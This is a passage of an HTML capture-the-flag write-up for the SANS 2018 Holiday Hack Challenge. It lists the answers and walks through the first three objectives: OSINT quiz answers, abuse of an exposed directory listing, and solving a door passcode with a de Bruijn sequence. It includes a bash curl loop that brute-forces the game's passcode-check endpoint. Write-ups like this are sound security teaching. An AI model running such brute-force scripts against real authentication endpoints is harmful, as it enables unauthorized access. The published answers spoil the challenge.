



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
        <meta name="author" content="B">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.2.0">
    
    
      
        <title>SANS 2018 Holiday Hack Challenge Guide</title>
      
    
    
      <link rel="stylesheet" href="assets/stylesheets/application.572ca0f0.css">
      
      
    
    
      <script src="assets/javascripts/modernizr.8c900955.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="assets/fonts/material-icons.css">
    
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#introduction" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="." title="SANS 2018 Holiday Hack Challenge Guide" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              SANS 2018 Holiday Hack Challenge Guide
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="." title="SANS 2018 Holiday Hack Challenge Guide" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    SANS 2018 Holiday Hack Challenge Guide
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        SANS 2018 Holiday Hack Challenge Guide
      </label>
    
    <a href="." title="SANS 2018 Holiday Hack Challenge Guide" class="md-nav__link md-nav__link--active">
      SANS 2018 Holiday Hack Challenge Guide
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" title="Introduction" class="md-nav__link">
    Introduction
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consolidated-answers" title="Consolidated Answers" class="md-nav__link">
    Consolidated Answers
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#main-objectives" title="Main Objectives" class="md-nav__link">
    Main Objectives
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-orientation-challenge" title="1) Orientation Challenge" class="md-nav__link">
    1) Orientation Challenge
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-directory-browsing" title="2) Directory Browsing" class="md-nav__link">
    2) Directory Browsing
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-de-bruijn-sequences" title="3) de Bruijn Sequences" class="md-nav__link">
    3) de Bruijn Sequences
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-data-repo-analysis" title="4) Data Repo Analysis" class="md-nav__link">
    4) Data Repo Analysis
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-ad-privilege-discovery" title="5) AD Privilege Discovery" class="md-nav__link">
    5) AD Privilege Discovery
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#6-badge-manipulation" title="6) Badge Manipulation" class="md-nav__link">
    6) Badge Manipulation
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#7-hr-incident-response" title="7) HR Incident Response" class="md-nav__link">
    7) HR Incident Response
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#8-network-traffic-forensics" title="8) Network Traffic Forensics" class="md-nav__link">
    8) Network Traffic Forensics
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9-ransomware-recovery" title="9) Ransomware Recovery" class="md-nav__link">
    9) Ransomware Recovery
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#9a-catch-the-malware" title="9a) Catch the Malware" class="md-nav__link">
    9a) Catch the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9b-identify-the-domain" title="9b) Identify the Domain" class="md-nav__link">
    9b) Identify the Domain
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9c-stop-the-malware" title="9c) Stop the Malware" class="md-nav__link">
    9c) Stop the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9d-recover-alabasters-password" title="9d) Recover Alabaster's Password" class="md-nav__link">
    9d) Recover Alabaster's Password
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#10-who-is-behind-it-all" title="10) Who Is Behind It All?" class="md-nav__link">
    10) Who Is Behind It All?
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#terminal-exercises" title="Terminal Exercises" class="md-nav__link">
    Terminal Exercises
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-essential-editor-skills-bushy-evergreen" title="1) Essential Editor Skills (Bushy Evergreen)" class="md-nav__link">
    1) Essential Editor Skills (Bushy Evergreen)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-the-name-game-minty-candycane" title="2) The Name Game (Minty Candycane)" class="md-nav__link">
    2) The Name Game (Minty Candycane)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-lethal-forensicelfication-tangle-coalbox" title="3) Lethal ForensicELFication (Tangle Coalbox)" class="md-nav__link">
    3) Lethal ForensicELFication (Tangle Coalbox)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-stall-mucking-report-wunorse-openslae" title="4) Stall Mucking Report (Wunorse Openslae)" class="md-nav__link">
    4) Stall Mucking Report (Wunorse Openslae)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-curling-master-holly-evergreen" title="5) CURLing Master (Holly Evergreen)" class="md-nav__link">
    5) CURLing Master (Holly Evergreen)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#6-yule-log-analysis-pepper-minstix" title="6) Yule Log Analysis (Pepper Minstix)" class="md-nav__link">
    6) Yule Log Analysis (Pepper Minstix)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#7-dev-ops-fail-sparkle-redberry" title="7) Dev Ops Fail (Sparkle Redberry)" class="md-nav__link">
    7) Dev Ops Fail (Sparkle Redberry)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#8-python-escape-from-la-sugarplum-mary" title="8) Python Escape from LA (SugarPlum Mary)" class="md-nav__link">
    8) Python Escape from LA (SugarPlum Mary)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9-sleigh-bell-lottery-shinny-upatree" title="9) Sleigh Bell Lottery (Shinny Upatree)" class="md-nav__link">
    9) Sleigh Bell Lottery (Shinny Upatree)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#changing-the-drawings-value" title="Changing the Drawing's Value" class="md-nav__link">
    Changing the Drawing's Value
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumping-to-the-winnerwinner-function" title="Jumping to the 'winnerwinner' function." class="md-nav__link">
    Jumping to the 'winnerwinner' function.
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#appendix" title="Appendix" class="md-nav__link">
    Appendix
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#a-google-ventilation-maze" title="A. Google Ventilation Maze" class="md-nav__link">
    A. Google Ventilation Maze
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#b-wannacookie-malware-analysis" title="B. Wannacookie Malware Analysis" class="md-nav__link">
    B. Wannacookie Malware Analysis
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" title="Introduction" class="md-nav__link">
    Introduction
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#consolidated-answers" title="Consolidated Answers" class="md-nav__link">
    Consolidated Answers
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#main-objectives" title="Main Objectives" class="md-nav__link">
    Main Objectives
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-orientation-challenge" title="1) Orientation Challenge" class="md-nav__link">
    1) Orientation Challenge
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-directory-browsing" title="2) Directory Browsing" class="md-nav__link">
    2) Directory Browsing
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-de-bruijn-sequences" title="3) de Bruijn Sequences" class="md-nav__link">
    3) de Bruijn Sequences
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-data-repo-analysis" title="4) Data Repo Analysis" class="md-nav__link">
    4) Data Repo Analysis
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-ad-privilege-discovery" title="5) AD Privilege Discovery" class="md-nav__link">
    5) AD Privilege Discovery
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#6-badge-manipulation" title="6) Badge Manipulation" class="md-nav__link">
    6) Badge Manipulation
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#7-hr-incident-response" title="7) HR Incident Response" class="md-nav__link">
    7) HR Incident Response
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#8-network-traffic-forensics" title="8) Network Traffic Forensics" class="md-nav__link">
    8) Network Traffic Forensics
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9-ransomware-recovery" title="9) Ransomware Recovery" class="md-nav__link">
    9) Ransomware Recovery
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#9a-catch-the-malware" title="9a) Catch the Malware" class="md-nav__link">
    9a) Catch the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9b-identify-the-domain" title="9b) Identify the Domain" class="md-nav__link">
    9b) Identify the Domain
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9c-stop-the-malware" title="9c) Stop the Malware" class="md-nav__link">
    9c) Stop the Malware
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9d-recover-alabasters-password" title="9d) Recover Alabaster's Password" class="md-nav__link">
    9d) Recover Alabaster's Password
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#10-who-is-behind-it-all" title="10) Who Is Behind It All?" class="md-nav__link">
    10) Who Is Behind It All?
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#terminal-exercises" title="Terminal Exercises" class="md-nav__link">
    Terminal Exercises
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-essential-editor-skills-bushy-evergreen" title="1) Essential Editor Skills (Bushy Evergreen)" class="md-nav__link">
    1) Essential Editor Skills (Bushy Evergreen)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-the-name-game-minty-candycane" title="2) The Name Game (Minty Candycane)" class="md-nav__link">
    2) The Name Game (Minty Candycane)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-lethal-forensicelfication-tangle-coalbox" title="3) Lethal ForensicELFication (Tangle Coalbox)" class="md-nav__link">
    3) Lethal ForensicELFication (Tangle Coalbox)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-stall-mucking-report-wunorse-openslae" title="4) Stall Mucking Report (Wunorse Openslae)" class="md-nav__link">
    4) Stall Mucking Report (Wunorse Openslae)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-curling-master-holly-evergreen" title="5) CURLing Master (Holly Evergreen)" class="md-nav__link">
    5) CURLing Master (Holly Evergreen)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#6-yule-log-analysis-pepper-minstix" title="6) Yule Log Analysis (Pepper Minstix)" class="md-nav__link">
    6) Yule Log Analysis (Pepper Minstix)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#7-dev-ops-fail-sparkle-redberry" title="7) Dev Ops Fail (Sparkle Redberry)" class="md-nav__link">
    7) Dev Ops Fail (Sparkle Redberry)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#8-python-escape-from-la-sugarplum-mary" title="8) Python Escape from LA (SugarPlum Mary)" class="md-nav__link">
    8) Python Escape from LA (SugarPlum Mary)
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#9-sleigh-bell-lottery-shinny-upatree" title="9) Sleigh Bell Lottery (Shinny Upatree)" class="md-nav__link">
    9) Sleigh Bell Lottery (Shinny Upatree)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#changing-the-drawings-value" title="Changing the Drawing's Value" class="md-nav__link">
    Changing the Drawing's Value
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jumping-to-the-winnerwinner-function" title="Jumping to the 'winnerwinner' function." class="md-nav__link">
    Jumping to the 'winnerwinner' function.
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#appendix" title="Appendix" class="md-nav__link">
    Appendix
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#a-google-ventilation-maze" title="A. Google Ventilation Maze" class="md-nav__link">
    A. Google Ventilation Maze
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#b-wannacookie-malware-analysis" title="B. Wannacookie Malware Analysis" class="md-nav__link">
    B. Wannacookie Malware Analysis
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>SANS 2018 Holiday Hack Challenge Guide</h1>
                
                <p><strong>Bernard J. Smith (berninator)</strong></p>
<p><strong>OSCP, CCNA Cyber Ops</strong></p>
<p><strong>mail@brndjsmith.net</strong></p>
<h3 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h3>
<p>This year's challenge comes in the form of a virtual cyber security conference, <strong>KringleCon!</strong> The goal is simple: work your way through ten objectives in order to identify the mastermind behind the activities surrounding the event. Every objective comes with a corresponding talk from an industry professional as well as a terminal exercise to earn hints from. So, if you're stuck, make sure to go over all of the learning materials again, as well as the provided hints; you may just get the flash of insight you need to get through it.</p>
<p>You can find more information about the challenge on the <a href="https://www.holidayhackchallenge.com/2018/index.html">Holiday Hack Challenge website.</a>
To start walking around the conference and solving objectives, just create an account on the <a href="https://kringlecon.com/">KringleCon website.</a></p>
<p>For your convenience, here is a rough map of KringleCon with the locations of each challenge and terminal exercise.</p>
<p><img alt="HHC2018 Map" src="HolidayHack2018-Map.png" /></p>
<p>Keep in mind, the following objectives have no in-world component:</p>
<ul>
<li>Challenge 2: Directory Browsing</li>
<li>Challenge 4: Data Repo Analysis</li>
<li>Challenge 5: AD Privilege Discovery</li>
<li>Challenge 7: HR Incident Response</li>
<li>Challenge 8: Network Traffic Forensics</li>
</ul>
<h3 id="consolidated-answers">Consolidated Answers<a class="headerlink" href="#consolidated-answers" title="Permanent link">&para;</a></h3>
<p>This is a consolidated list of the answers for use on the <a href="https://www.holidayhackchallenge.com/2018/story.html">main website</a>. Please keep in mind, if you wish to go through the challenge through <a href="https://kringlecon.com/">KringleCon</a> then some of these answers may require you to also interact with an in-game object.</p>
<ol>
<li>Happy Trails</li>
<li>John McClane </li>
<li>Welcome unprepared speaker!</li>
<li>Yippee-ki-yay</li>
<li>LDUBEJ00320@AD.KRINGLECASTLE.COM </li>
<li>19880715 </li>
<li>Fancy Beaver</li>
<li>Mary Had a Little Lamb</li>
<li>Snort is alerting on all ransomware and only the ransomware! </li>
<li>erohetfanu.com</li>
<li>Successfully registered yippeekiyaa.aaay!</li>
<li>ED#ED#EED#EF#G#F#G#ABA#BA#B</li>
<li>You have unlocked Santa's vault!</li>
<li>Santa</li>
</ol>
<h3 id="main-objectives">Main Objectives<a class="headerlink" href="#main-objectives" title="Permanent link">&para;</a></h3>
<h4 id="1-orientation-challenge">1) Orientation Challenge<a class="headerlink" href="#1-orientation-challenge" title="Permanent link">&para;</a></h4>
<blockquote>
<p>What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle? <em>For hints on achieving this objective, please visit Bushy Evergreen and help him with the Essential Editor Skills Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p><img alt="Challenge Location" src="challenges/1-location.png" /></p>
<p>This challenge stretches our open-source intelligence (OSINT) gathering muscles by requiring us to search through previous challenges for the answers to the quiz questions. Luckily, we can find every link to the previous challenges in one page: <a href="https://holidayhackchallenge.com/past-challenges/">https://holidayhackchallenge.com/past-challenges/</a></p>
<p>We can access the quiz through the kiosk located on the first floor, but another option to is to navigate directly to the challenge's link: <a href="https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html">https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html</a></p>
<p><img alt="Quiz Page" src="challenges/1-quiz.png" /></p>
<p>Answers:</p>
<table>
<thead>
<tr>
<th>Question</th>
<th>Answer</th>
</tr>
</thead>
<tbody>
<tr>
<td>In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?</td>
<td>Firmware</td>
</tr>
<tr>
<td>In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?</td>
<td>ATNAS</td>
</tr>
<tr>
<td>In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?</td>
<td>Business card</td>
</tr>
<tr>
<td>In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?</td>
<td>Cranberry Pi</td>
</tr>
<tr>
<td>In 2017, the North Pole was being bombarded by giant objects. What were they?</td>
<td>Snowballs</td>
</tr>
<tr>
<td>In 2017, Sam the snowman needed help reassembling pages torn from what?</td>
<td>The Great Book</td>
</tr>
</tbody>
</table>
<p>Upon correctly answering each question, we're greeted with the secret phrase: <strong><em>Happy Trails</em></strong></p>
<p><img alt="Answer - Happy Trails" src="challenges/1-answer.png" /></p>
<h4 id="2-directory-browsing">2) Directory Browsing<a class="headerlink" href="#2-directory-browsing" title="Permanent link">&para;</a></h4>
<blockquote>
<p>Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? <a href="https://cfp.kringlecastle.com/">Please analyze the CFP site to find out</a>. <em>For hints on achieving this objective, please visit Minty Candycane and help her with the The Name Game Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>Upon navigating to <a href="https://cfp.kringlecastle.com/">https://cfp.kringlecastle.com/</a>, we begin by seeing our options in mapping out the website. However, the various links within the homepage lead only to <a href="https://cfp.kringlecastle.com/cfp/cfp.html">https://cfp.kringlecastle.com/cfp/cfp.html</a>, making that our only other option, right now.</p>
<p><img alt="CFP Index Page" src="challenges/2-index.png" /></p>
<p>After running out of options for publically navigable pages, we start looking into ways to access more non-public ones. Our first attempt was to manually request <a href="https://cfp.kringlecastle.com/cfp/">https://cfp.kringlecastle.com/cfp/</a>, by removing the 'cfp.html' from the URL. This proved very fruitful as we discover that the web server has left 'directory indexing' enabled, showing us a list of files within the '/cfp/' directory. One of the two files seems to be a list of rejected talks and should contain the information we're looking for.</p>
<p><img alt="CFP Directory Indexing" src="challenges/2-indexing.png" /></p>
<p>There are two options to obtain this information: in the browser, or in the command line.</p>
<p>Since the file is small, only 30KBs , and our search is relatively simple, we can make use of the browser's find function to search for the target information.</p>
<p><img alt="CFP Browser Searching" src="challenges/2-rejectedcsv.png" /></p>
<p>However, if the file were to be much larger in size or if we needed to find more nuanced data, we could instead make use of the terminal to find our target information. The example here uses the 'curl' program to download the 'rejected-talks.csv' file and pipes it into the 'grep' program, which allows us to search the data using regular expressions. In this case, the regular expression is only a simple string.</p>
<pre><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ curl -s &quot;https://cfp.kringlecastle.com/cfp/rejected-talks.csv&quot; | grep &quot;Data Loss for Rainbow Teams: A Path in the Darkness&quot;
qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11
</code></pre>

<p>Through either of these searches, we discover that the author of 'Data Loss for Rainbow Teams: A Path in the Darkness', and the answer to this challenge, is <strong><em>John McClane</em></strong>.</p>
<h4 id="3-de-bruijn-sequences">3) de Bruijn Sequences<a class="headerlink" href="#3-de-bruijn-sequences" title="Permanent link">&para;</a></h4>
<blockquote>
<p>When you break into the speaker unpreparedness room, what does Morcel Nougat say? <em>For hints on achieving this objective, please visit Tangle Coalbox and help him with Lethal ForensicELFication Cranberry Pi terminal challenge.</em></p>
</blockquote>
<p>We can find this challenge on in the right hallway of the second floor.</p>
<p><img alt="Location" src="challenges/3-location.png" /></p>
<p>Clicking on the door passcode sprite brings us to the next challenge. We are given four symbols to chose from in order to create a four character passcode. Alternatively, you can use the following link to work on this challenge: <a href="https://doorpasscoden.kringlecastle.com/">https://doorpasscoden.kringlecastle.com/</a></p>
<p><img alt="Door Passcode - Incorrect Guess" src="challenges/3-wrong.png" /></p>
<p>One thing that is interesting about this lock's behavior is, whenever you input another character while the passcode is four characters long, the new character is simply appended to the end of the passcode while removing the first character. This cyclic characteristic makes it possible to greatly simplify the time it would take to manually brute force the correct password by using a de Bruijn sequence.</p>
<p>A de Bruijn sequence is the shortest sequence where every combination of a given character set and word length will exist within that sequence. For example, given a character set of $[a, b, c]$ and a word length of two, you can find every possible combination of those characters within the following sequence: ${a a b a c b b c c}$</p>
<p>Since this passcode application simply looks at the previous four characters entered, we can manually brute force the door's code by inputting a de Bruijn sequence, one by one. By assigning each character to a number, we generate a sequence with a character set of four and a word length of four, using this website: http://www.hakank.org/comb/debruijn.cgi?k=4&amp;n=4&amp;submit=Ok</p>
<p>$Where\ [0 = \Delta, 1 = \square, 2 = \bigcirc, 3 = \star]$</p>
<p>0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3</p>
<p>Using this sequence, we will brute force the door's combination within 256 button presses. After working through 22 characters of the sequence, we reach the correct answer, $\Delta\square\bigcirc\Delta$, located within the sequence here:
0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 <strong>0 1 2 0</strong> 0 1 3 0 0 2 1</p>
<p>After inputting the correct passcode and breaking into the speaker unpreparedness room, Morcel Nougat gives us the answer to this challenge: <strong><em>Welcome unprepared speaker!</em></strong> </p>
<p><img alt="Door Passcode - Correct Guess" src="challenges/3-correct.png" /></p>
<p><img alt="Welcome unprepared speaker!" src="challenges/3-morcel.png" /></p>
<p><img alt="Website - Welcome unprepared speaker!" src="challenges/3-sitevictory.png" /></p>
<p><strong>Alternative Solutions:</strong>
<em>Downloading the victory message directly:</em>
Looking through the source code for https://doorpasscoden.kringlecastle.com reveals an interesting line of HTML near the bottom of the source at line 123. This appears to be the victory banner used in the event of a correct passcode. By navigating to the image directly, we can simply see the victory message without dealing with bruteforcing the passcode.</p>
<pre><code class="html">&lt;img id=&quot;banner&quot; src=&quot;db-victory-banner.png&quot; style=&quot;position:absolute; left:50%; top:50%; transform: translate(-50%, -50%); max-width:60%; width: 60%; visibility: hidden;&quot; onMouseDown='this.style.visibility=&quot;hidden&quot;'&gt;
</code></pre>

<p><img alt="Website - Victory Banner" src="challenges/3-dbvictorybanner.png" /></p>
<p>We can also discover this image via the 'Sources' tab of Google Chrome's DevTools.</p>
<p><img alt="Website - Victory Banner Sources" src="challenges/3-chromesources.png" /></p>
<p><em>Brute-forcing the passcode:</em>
By examining the passcode application through the Chrome DevTools' Network tab, we can learn how it performs the password check and verifies validity.</p>
<p><img alt="Website - Requests" src="challenges/3-requests.png" /></p>
<p>Here we see that the application checks the passcode's correctness by sending a GET request to https://doorpasscoden.kringlecastle.com/checkpass.php with two GET parameters:</p>
<p><code>'i' - the passcode to check, encoded using the numbers 0 to 3.</code></p>
<p><code>resourceId - set to undefined</code></p>
<p>If the passcode submitted is incorrect, then the webpage responds with:</p>
<p><code>{"success":false,"message":"Incorrect guess."}</code></p>
<p>If the passcode submitted is correct <em>(0120)</em> then the page responds with:</p>
<p><code>{"success":true,"resourceId":"undefined","hash":"0273f6448d56b3aba69af76f99bdc741
268244b7a187c18f855c6302ec93b703","message":"Correct guess!"}</code></p>
<p>Since the total number of passcode combinations is $256$, or $4^4$, this is well within the possibility for a computer to brute force.
Using the following command, we can generate a wordlist to conduct the brute-force with. This first generates a sequence of numbers from 0000 to 3333, using leading zeroes for numbers less than four characters in length. Then, using grep's extended regular expression function, it filters all numbers who have a character other than 0, 1, 2, or 3, leaving us with 256 valid passcodes to brute-force with.</p>
<p><code>bernard@Bernard-PC:~/NetsecStudy/sans2018$ seq -w 0 3333 | grep -E "[0-3]{4}" &gt; doorpasses.txt</code></p>
<p>Finally, using the following script, we can brute force the correct passcode to input:</p>
<pre><code class="bash">#!/bin/bash

# Iterates through each line of doorpasses.txt
for i in `cat doorpasses.txt`; do
    # Using grep's '-q' flag, we test if the response from the server includes 'Correct'
    # If so, then we know we've hit the correct passcode
    if curl -s &quot;https://doorpasscoden.kringlecastle.com/
    checkpass.php?i=$i&amp;resourceId=undefined&quot; | grep -q &quot;Correct&quot;; then
        echo &quot;The password is $i&quot;
        curl -s &quot;https://doorpasscoden.kringlecastle.com/checkpass.php?
        i=$i&amp;resourceId=undefined&quot;
        echo &quot;&quot;
        break;
    fi
done
</code></pre>

<p>Example run, completes in approximately five seconds:</p>
